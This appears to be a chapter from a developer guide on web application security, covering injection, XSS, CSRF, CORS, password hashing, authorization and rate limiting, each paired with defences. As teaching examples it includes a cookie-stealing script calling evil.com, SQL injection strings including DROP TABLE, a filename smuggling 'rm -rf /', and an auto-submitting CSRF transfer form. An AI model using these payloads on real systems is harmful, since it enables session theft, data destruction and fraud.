# Security

## The Problem

Security isn't a feature you add — it's a property your system either has or doesn't. Most security vulnerabilities aren't sophisticated hacking. They're ordinary mistakes: a developer concatenates user input into a SQL query, forgets to escape HTML output, or commits an API key to git.

The OWASP (Open Web Application Security Project) Top 10 is the industry-standard list of the most critical web application security risks, updated every few years from real-world attack data. When a security auditor reviews your app, this is their starting checklist. This topic covers the attacks most relevant to the TypeScript/Python web apps you'll be building.

---

## Injection Attacks

An attacker sends malicious data that gets interpreted as code by your system.

### SQL Injection

The most well-known attack. User input is concatenated directly into a SQL query:

```python
# VULNERABLE: user input becomes part of the SQL command
query = f"SELECT * FROM users WHERE email = '{user_input}'"

# If user_input is: ' OR '1'='1
# Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
# This returns ALL users — the attacker dumped your user table

# Even worse: user_input is: '; DROP TABLE users; --
# Query becomes: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
# Your users table is gone
```

**Prevention: parameterized queries (prepared statements).** The database treats the parameter as data, never as SQL code:

```python
# SAFE: parameter is data, not SQL
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```

```typescript
// SAFE: parameterized query
const user = await db.query('SELECT * FROM users WHERE email = $1', [userInput]);
```

**ORMs (SQLAlchemy, Prisma, Drizzle) use parameterized queries by default.** But raw query methods (`.execute()`, `$queryRaw`, `Prisma.$queryRawUnsafe`) can still be vulnerable if you concatenate strings. If you must write raw SQL, always use the parameterized form.

### NoSQL Injection

Same concept, different database:

```python
# VULNERABLE: if user_input is a dict like {"$ne": null}, this matches ALL users
db.users.find({"email": user_input})
```

**Prevention:** Validate input types with your schema (Pydantic/Zod) before using it in queries. If `email` should be a string, Pydantic rejects a dict. This is where [Data Integrity](./data-integrity.md) and security intersect — schema validation at boundaries is a security defence.

### Command Injection

User input ends up in a shell command:

```python
# VULNERABLE
os.system(f"convert {user_filename} output.png")
# user_filename = "image.png; rm -rf /"
# Executes: convert image.png; rm -rf /
```

**Prevention:** Never pass user input to shell commands. Use library APIs instead. If you must use a subprocess, use array syntax and never `shell=True`:

```python
# SAFE: arguments are a list, not interpolated into a string
subprocess.run(["convert", user_filename, "output.png"], check=True)
# Even if user_filename contains special characters, they're treated as a filename
```

```typescript
// SAFE: arguments are an array
import { execFile } from 'child_process';
execFile('convert', [userFilename, 'output.png'], callback);
// NOT execSync(`convert ${userFilename} output.png`) — that's vulnerable
```

---

## XSS (Cross-Site Scripting)

An attacker injects JavaScript into your page that runs in other users' browsers.

### How It Works

Your app has a comments feature. An attacker posts:

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

If your app renders this without sanitizing, every user who views the page runs the attacker's JavaScript. The script sends their session cookie to the attacker, who can now impersonate them.

### Types

- **Stored XSS** — malicious script saved in your database (the comment example). Most dangerous — affects every user who views the page.
- **Reflected XSS** — malicious script in the URL: `yourapp.com/search?q=<script>...</script>`. Server includes the search term in the page without escaping.
- **DOM-based XSS** — Client-side JavaScript reads from `window.location` or `document.referrer` and inserts it into the DOM unsanitized.

### Prevention

**React escapes by default** — `{variable}` in JSX converts `<script>` to harmless text `&lt;script&gt;`:

```tsx
// SAFE: React auto-escapes — script tags become visible text, not executable code
<p>{comment.text}</p>

// DANGEROUS: dangerouslySetInnerHTML bypasses escaping — never use with user content
<p dangerouslySetInnerHTML={{ __html: comment.text }} />
```

**Server-rendered HTML (Jinja2, etc.):**

```python
# Jinja2 auto-escapes by default in Flask/FastAPI
# {{ user_input }} — auto-escaped (safe)
# {{ user_input | safe }} — DISABLES escaping (dangerous with user content)
```

**Additional protection:** Content-Security-Policy headers (see below) prevent inline scripts from executing even if they get injected.

---

## CSRF (Cross-Site Request Forgery)

An attacker tricks a logged-in user's browser into making a request to your app.

### How It Works

You're logged into your banking app. You visit a malicious page containing:

```html
<form action="https://yourbank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker-account" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

Your browser automatically includes your bank's session cookie. The bank sees a valid session and processes the transfer. You didn't click anything — visiting the page was enough.

### Prevention

**CSRF tokens** — a random value in every form that the attacker can't guess:

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random-unguessable-value" />
  <!-- ... other fields ... -->
</form>
```

The server generates a unique token per session and rejects requests without it. The attacker can't read the token (same-origin policy prevents cross-origin reads).

**Modern APIs with Bearer tokens:** If your API uses `Authorization: Bearer <token>` headers instead of cookies, CSRF isn't a concern. The attacker's page can't set custom headers on cross-origin requests. CSRF is specifically a cookie-based authentication problem.

**Framework support:**
- **FastAPI:** Typically uses Bearer tokens, not cookies — CSRF not a concern
- **Next.js:** Server Actions include CSRF protection automatically
- **Express:** Use `csrf-csrf` middleware (`csurf` is deprecated)

---

## CORS (Cross-Origin Resource Sharing)

A browser mechanism that controls which websites can call your API.

By default, JavaScript on `frontend.com` cannot call `api.com`. The browser blocks it. CORS headers tell the browser which origins are allowed.

### Configuration

```typescript
// DANGEROUS: allows ANY website to call your API
app.use(cors({ origin: '*' }));

// DANGEROUS: reflects whatever origin the request came from
app.use(cors({ origin: true }));

// SAFE: explicitly list allowed origins
app.use(cors({
  origin: ['https://myapp.com', 'https://staging.myapp.com'],
  credentials: true,
}));
```

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://myapp.com", "https://staging.myapp.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)
```

**When `*` is OK:** For truly public APIs with no authentication (public weather API, CDN). If your API requires auth or uses cookies, `*` is a security hole.

**Development:** You'll often need `http://localhost:3000` in your CORS origins during development. Make sure this doesn't leak into production config — use environment-specific CORS origins via your [Configuration](./configuration.md) setup.

### Preflight Requests (OPTIONS)

When the browser makes certain cross-origin requests, it first sends an OPTIONS request to ask "is this allowed?" before sending the actual request. This is called a **preflight**.

**What triggers a preflight:**
- Custom headers (e.g., `Authorization: Bearer ...`)
- HTTP methods other than GET, HEAD, or POST
- POST with a content type other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` (so `application/json` triggers a preflight)

Since most API calls use `Authorization` headers and `Content-Type: application/json`, **almost every API request triggers a preflight.**

**What happens:**
```
1. Browser sends: OPTIONS /api/users (preflight)
2. Server responds with CORS headers (allowed origins, methods, headers)
3. Browser checks the response — if allowed, sends the real request
4. Server responds to the real request
```

If your server doesn't handle OPTIONS requests, or doesn't include the right CORS headers in the OPTIONS response, the browser never sends the actual request — and you get a cryptic CORS error in the console.

**Most CORS middleware handles this automatically.** The `cors()` middleware in Express and `CORSMiddleware` in FastAPI both respond to OPTIONS requests correctly. The common mistake is adding CORS headers manually to your routes but forgetting to handle OPTIONS — use the middleware instead.

---

## Security Headers

HTTP headers that tell browsers to enable security features. In Node.js, one package adds sensible defaults:

### Node.js / Express — helmet

```typescript
import helmet from 'helmet';
app.use(helmet());
// Adds ~15 security headers with sensible defaults in one line
```

### FastAPI / Python

```python
@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["X-XSS-Protection"] = "0"  # disabled — CSP is the modern replacement
    return response
```

### Key Headers

| Header | What it does | Why it matters |
|--------|-------------|----------------|
| `Strict-Transport-Security` | Forces HTTPS for all future requests | Prevents HTTP downgrade attacks |
| `Content-Security-Policy` | Controls what scripts/styles/images can load | Blocks XSS by preventing inline scripts and unauthorized sources |
| `X-Content-Type-Options: nosniff` | Prevents browsers from guessing content types | Stops browsers interpreting a text file as JavaScript |
| `X-Frame-Options: DENY` | Prevents your page from being embedded in an iframe | Prevents clickjacking attacks |
| `Referrer-Policy` | Controls what URL info is sent to external sites | Prevents leaking sensitive URL paths |

### Content-Security-Policy (CSP)

The most powerful and most complex security header. A basic policy:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

This says: only load scripts and resources from my own domain. No inline scripts (blocks most XSS). `'unsafe-inline'` for styles is a pragmatic compromise — many CSS frameworks need it.

CSP is often added incrementally: start with `Content-Security-Policy-Report-Only` (logs violations without blocking them), review the reports, then enforce.

---

## Password Hashing

If your app has user accounts with passwords, you must store them securely.

**Never store:**
- Plain text passwords
- MD5 hashes (broken, cracked instantly)
- SHA256 hashes (too fast — attackers try billions of guesses per second)

**Use bcrypt or argon2** — purpose-built password hashing algorithms that are intentionally slow (tunable) and include a salt (random data so identical passwords produce different hashes).

### TypeScript

```typescript
import bcrypt from 'bcrypt';

// During registration — hash the password
const saltRounds = 12;  // higher = slower = more secure (12 is a good default)
const hash = await bcrypt.hash(password, saltRounds);
// Store hash in database. NEVER store the plain password.

// During login — verify the password
const isValid = await bcrypt.compare(passwordAttempt, storedHash);
if (!isValid) throw new AuthenticationError("Invalid credentials");
```

### Python

```python
import bcrypt

# During registration
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# Store hashed in database (it's a bytes object — decode to str if needed)

# During login
is_valid = bcrypt.checkpw(password_attempt.encode(), stored_hash)
if not is_valid:
    raise AuthenticationError("Invalid credentials")
```

### Why Salts Matter

Without a salt, every user with password "Password123" has the same hash. An attacker can precompute hashes for common passwords (a **rainbow table**) and look them up instantly.

With a salt, a random value is mixed into each hash. Identical passwords produce different hashes. Precomputation becomes useless.

bcrypt includes the salt automatically in the hash output — you don't manage it separately.

---

## Dependency Scanning

Your app's security is only as strong as its weakest dependency. A known vulnerability in a package you use is a known vulnerability in your app.

### Scanning Tools

```bash
# npm — built-in
npm audit
npm audit fix  # auto-fix where possible

# Python
pip-audit           # pip install pip-audit
safety check        # pip install safety
```

### Dependabot (GitHub, free)

Automatically creates PRs to update vulnerable dependencies. Enable in your repo settings (Security tab → Dependabot alerts → Enable). It monitors the GitHub Advisory Database and opens PRs when vulnerabilities are disclosed.

### Lockfile Integrity

Always commit your lockfile (`package-lock.json`, `poetry.lock`, `uv.lock`). In CI, use `npm ci` (not `npm install`) — it installs exactly what the lockfile says and fails if out of sync. This prevents supply chain attacks that tamper with dependency resolution.

### Typosquatting

Attackers publish packages with names like `lodsah` (misspelling of `lodash`). Before adding a dependency:
- Check download counts (legitimate packages have millions)
- Check maintenance status (last publish date, open issues)
- Spell the name carefully
- Prefer well-known packages over obscure alternatives

---

## Authentication vs Authorization

These sound similar but mean completely different things:

**Authentication (AuthN)** — "Who are you?" Verifying identity. Login, session tokens, JWTs.

**Authorization (AuthZ)** — "What are you allowed to do?" Checking permissions. Can this user access this resource?

A common and dangerous mistake — checking authentication but not authorization:

```typescript
// BAD: verifies user is logged in, but not that they own this resource
app.delete('/users/:id', requireAuth, async (req, res) => {
  await db.deleteUser(req.params.id);  // Any user can delete ANY other user!
});

// GOOD: checks both authentication AND authorization
app.delete('/users/:id', requireAuth, async (req, res) => {
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    throw new AuthorizationError("Can only delete your own account");
  }
  await db.deleteUser(req.params.id);
});
```

```python
# BAD
@app.delete("/users/{user_id}")
async def delete_user(user_id: str, current_user: User = Depends(get_current_user)):
    await db.delete_user(user_id)  # Any authenticated user can delete anyone!

# GOOD
@app.delete("/users/{user_id}")
async def delete_user(user_id: str, current_user: User = Depends(get_current_user)):
    if current_user.id != user_id and current_user.role != "admin":
        raise AuthorizationError("Can only delete your own account")
    await db.delete_user(user_id)
```

### The Authorization Checklist

For every endpoint that modifies or returns sensitive data, ask:
1. Is the user authenticated? (Do they have a valid session/token?)
2. Are they authorized for this specific resource? (Do they own it? Are they an admin?)
3. Are they authorized for this action? (Can they read but not write? Can they view but not delete?)

### Authentication Implementation

The AuthN/AuthZ distinction above tells you *what* to check. Here's *how* to implement authentication.

**JWT (JSON Web Token) — the most common API auth pattern:**

A JWT is a signed token that contains user information. The server creates it during login, the client sends it with every request, and the server verifies it without needing a database lookup.

```typescript
// Login endpoint — creates a JWT
import jwt from 'jsonwebtoken';

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.findUserByEmail(email);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    throw new AuthenticationError("Invalid credentials");
  }

  const token = jwt.sign(
    { userId: user.id, role: user.role },  // payload — don't put secrets here
    env.JWT_SECRET,                         // signing key from config
    { expiresIn: '24h' },                  // token expires
  );
  res.json({ token });
});

// Auth middleware — verifies JWT on protected routes
function requireAuth(req: Request, res: Response, next: NextFunction) {
  const header = req.headers.authorization;
  if (!header?.startsWith('Bearer ')) {
    throw new AppError("Missing authorization header", 401);
  }

  try {
    const token = header.slice(7);  // remove "Bearer " prefix
    const payload = jwt.verify(token, env.JWT_SECRET);
    req.user = payload;  // attach user info to request
    next();
  } catch {
    throw new AppError("Invalid or expired token", 401);
  }
}

// Usage
app.get('/api/users/:id', requireAuth, getUser);
```

```python
# FastAPI — dependency-based auth
from fastapi import Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt

security = HTTPBearer()

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security),
) -> dict:
    try:
        payload = jwt.decode(credentials.credentials, settings.jwt_secret, algorithms=["HS256"])
        return payload
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")

# Usage — inject as a dependency
@app.get("/api/users/{user_id}")
async def get_user(user_id: str, current_user: dict = Depends(get_current_user)):
    # current_user is the verified JWT payload
    ...
```

**Session-based auth** — an alternative to JWTs where the server stores session data. The client receives a session cookie. More common in traditional web apps (server-rendered HTML), less common in API-first apps. Frameworks like NextAuth/Auth.js handle this.

**Delegated auth (OAuth providers)** — instead of managing passwords yourself, let a third-party handle authentication: Auth0, Clerk, Supabase Auth, NextAuth. This is often the pragmatic choice for startups — authentication is hard to get right, and security incidents from homegrown auth are common.

**When to use which:**
| Approach | Best for | Tradeoff |
|----------|----------|----------|
| **JWT** | API-first apps, mobile clients, microservices | You manage token storage, expiry, refresh |
| **Sessions** | Server-rendered apps, traditional web | Requires server-side session store |
| **OAuth provider** | When you don't want to manage passwords at all | Vendor dependency, cost at scale |

---

## Rate Limiting

Rate limiting restricts how many requests a client can make in a time window. Without it, a single client (or bot, or attacker) can overwhelm your API.

### Why You Need It

- **Abuse prevention** — stops bots from brute-forcing login, scraping data, or flooding your API
- **Fair usage** — prevents one heavy user from degrading the service for everyone else
- **Cost protection** — if your API calls paid services (AI models, payment processors), an unrestricted client can run up your bill
- **DDoS mitigation** — rate limiting alone doesn't stop a distributed attack, but it reduces the impact

### Common Strategies

**Per-user / per-API-key:** "100 requests per minute per authenticated user." The most common approach. Identified users or API keys get individual limits.

**Per-IP:** "50 requests per minute per IP address." Useful for unauthenticated endpoints (login, signup). Less reliable because many users can share an IP (corporate NATs, VPNs).

**Per-endpoint:** Different limits for different endpoints. A search endpoint might allow 60/min, while a payment endpoint might allow 10/min.

### Implementation

Most frameworks have rate limiting middleware or libraries. You don't implement the algorithm yourself.

**Express (TypeScript):**
```typescript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 60 * 1000,    // 1-minute window
  max: 100,                // 100 requests per window per IP
  standardHeaders: true,   // Return rate limit info in `RateLimit-*` headers
  message: {
    type: "RateLimitError",
    title: "Too many requests",
    status: 429,
  },
});

app.use('/api/', limiter);
```

**FastAPI (Python):**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.get("/api/search")
@limiter.limit("60/minute")
async def search(request: Request, query: str):
    ...
```

### The 429 Response

When a client exceeds the rate limit, return HTTP 429 (Too Many Requests) with a `Retry-After` header telling the client when to try again:

```
HTTP/1.1 429 Too Many Requests
Retry-After: 30
RateLimit-Limit: 100
RateLimit-Remaining: 0
RateLimit-Reset: 1680000060
```

This connects to [Resilience](./resilience.md) — well-behaved clients read the `Retry-After` header and wait before retrying.

---

## Secrets Management

Covered in detail in [Configuration](./configuration.md), but the security perspective adds:

- **Never commit secrets to git.** Even deleted secrets live in git history forever. Bots scan GitHub for exposed keys and exploit them within minutes.
- **Rotate secrets regularly.** If a key is compromised, rotate immediately. Some teams rotate all keys quarterly as a practice.
- **Use a secret manager in production.** AWS Secrets Manager, HashiCorp Vault, or your cloud provider's equivalent. Not environment variables set manually on servers.
- **Least privilege.** API keys should have minimum permissions needed. A read-only key shouldn't have write access. A key for one service shouldn't access another.
- **Never log secrets.** Check that your structured logging doesn't accidentally include config objects containing API keys. Scrub sensitive fields before logging.

---

## Authorization Models

Authentication answers "who are you?" Authorization answers "what are you allowed to do?" Many applications handle authentication well but then do authorization ad-hoc — scattering `if (user.role === 'admin')` checks through the codebase with no consistent model.

### RBAC — Role-Based Access Control

Users are assigned roles. Roles have permissions. The application checks permissions, not individual users.

```typescript
// Define what each role can do — one place, not scattered
const PERMISSIONS = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read'],
} as const;

function canPerform(role: string, action: string): boolean {
  return PERMISSIONS[role]?.includes(action) ?? false;
}
```

RBAC is the right starting point for most applications. It breaks down when permissions depend on *which specific resource* is being accessed (e.g., "editors can only edit their own posts"), which is where ABAC comes in.

### ABAC — Attribute-Based Access Control

Permissions are evaluated based on attributes of the user, the resource, and the context. More expressive than RBAC but more complex to implement.

```typescript
// "Can this user edit this document?"
// Depends on: user's role, user's team, document's owner, document's status
function canEditDocument(user: User, document: Document): boolean {
  if (user.role === 'admin') return true;
  if (document.ownerId === user.id) return true;
  if (document.teamId === user.teamId && user.role === 'editor') return true;
  return false;
}
```

Most real-world applications use a hybrid: RBAC for broad access categories, with attribute-based rules for specific resource-level checks.

### Enforce server-side, display client-side

Authorization checks must happen on the server. Client-side checks are for UX only — hiding buttons the user can't use, disabling forms they can't submit. A determined user can bypass any client-side check.

```typescript
// Client-side: UX convenience — hide the button
{canManageUsers && <Button>Manage Users</Button>}

// Server-side: actual enforcement — reject the request
if (!canPerform(user.role, 'manage_users')) {
  return errorResponse('Forbidden', 403);
}
```

If your frontend hides a button but the API endpoint doesn't check permissions, you have no security — just a hidden UI element.

### Privilege escalation through elevated functions

Database stored procedures, serverless functions, and backend API endpoints often run with elevated permissions — an admin database connection, a service account, or a privileged execution context. This is necessary: the function needs to access data that the caller normally can't reach.

The trap: if the function accepts a scope parameter from the caller (like a tenant ID, user ID, or organisation ID), and doesn't independently verify the caller is authorised for that scope, any caller can access any scope by simply changing the parameter.

```python
# VULNERABLE: function runs with admin privileges, trusts caller-supplied tenant_id
def get_tenant_data(tenant_id: str, caller_token: str):
    # Verifies caller is authenticated — yes
    verify_token(caller_token)
    # But does NOT verify caller belongs to this tenant
    return db.query("SELECT * FROM data WHERE tenant_id = %s", tenant_id)
    # Any authenticated user can read any tenant's data
```

```python
# SAFE: function verifies caller's relationship to the requested scope
def get_tenant_data(tenant_id: str, caller_token: str):
    caller = verify_token(caller_token)
    if not caller.has_access_to(tenant_id):
        raise AuthorizationError("Not authorised for this tenant")
    return db.query("SELECT * FROM data WHERE tenant_id = %s", tenant_id)
```

This applies to any function with elevated privileges: database stored procedures that bypass row-level security, API endpoints using a service account, serverless functions with admin credentials. **If the function has more permissions than the caller, it must independently verify the caller's authorisation for the requested scope.**

### Multi-tenant isolation

In multi-tenant systems, the authorization question is not just "can this user do this action?" but "can this user do this action *for this tenant*?" Every data access path — direct queries, stored procedures, API endpoints — must include the tenant boundary. A single missed check means one tenant can see another's data.

The pattern: every query includes the tenant filter, and the tenant ID comes from the authenticated session (verified server-side), never from the request body or URL.

---

## Anti-Patterns

| Don't | Do Instead | Why |
|-------|-----------|-----|
| Concatenate user input into SQL/commands | Use parameterized queries and array-based subprocess calls | Injection attacks — the #1 security risk |
| Use `dangerouslySetInnerHTML` with user content | Let React/template engine auto-escape | XSS — attacker runs JS in your users' browsers |
| Set `Access-Control-Allow-Origin: *` with auth | Explicitly list allowed origins | Any website can call your authenticated API |
| Skip security headers | Use `helmet` (Node.js) or set headers in middleware | Missing headers leave browser protections disabled |
| Store passwords as plain text or MD5/SHA256 | Use bcrypt or argon2 with salt rounds of 12+ | Weak hashing means stolen databases are cracked in minutes |
| Check authentication but not authorization | Always verify the user has permission for the specific resource and action | Authenticated doesn't mean authorized — user A shouldn't access user B's data |
| Commit `.env` files to git | Add to `.gitignore`, use `.env.example` for documentation | Secrets in git history are exploited by automated scanners |
| Ignore `npm audit` / `pip-audit` warnings | Run audit in CI, fix vulnerabilities promptly | Known vulnerabilities in dependencies are the easiest attack vector |
| Use `shell=True` in subprocess calls (Python) | Use array syntax: `subprocess.run(["cmd", arg1, arg2])` | `shell=True` enables command injection |
| Return detailed error messages to clients in production | Return generic messages, log details server-side | Stack traces and SQL errors leak internal details to attackers |

---

## Deciding for Your Project

When starting a new project, determine:

1. **Does your app have user accounts?** If yes → you need authentication, authorization, password hashing, CSRF protection (if using cookies).
2. **Does your app accept user input?** If yes (and it almost always does) → you need input validation (see [Data Integrity](./data-integrity.md)), XSS protection, injection prevention.
3. **Does your app have an API?** If yes → you need CORS configuration, security headers, consistent error responses that don't leak internals.
4. **What sensitive data do you handle?** This determines your security posture — a todo app has different requirements than a payment system.
5. **What's your authentication method?** Cookie-based (needs CSRF tokens), Bearer token (simpler, no CSRF concern), OAuth (delegated to a provider like Auth0, Clerk).

---

## Related Topics

- **Input validation as security** — see [Data Integrity](./data-integrity.md) for schema validation at boundaries, which is the first line of defence against injection
- **Error responses and information leakage** — see [Error Handling](./error-handling.md) for why you must never expose stack traces or internal error details
- **Secrets in configuration** — see [Configuration](./configuration.md) for .env management, secret managers, and the fail-fast pattern
- **Dependency management** — see [Deployment](./deployment.md) for lockfile integrity and supply chain security in CI/CD
- **Logging and secrets** — see [Logging](./logging.md) for ensuring sensitive data is scrubbed from logs
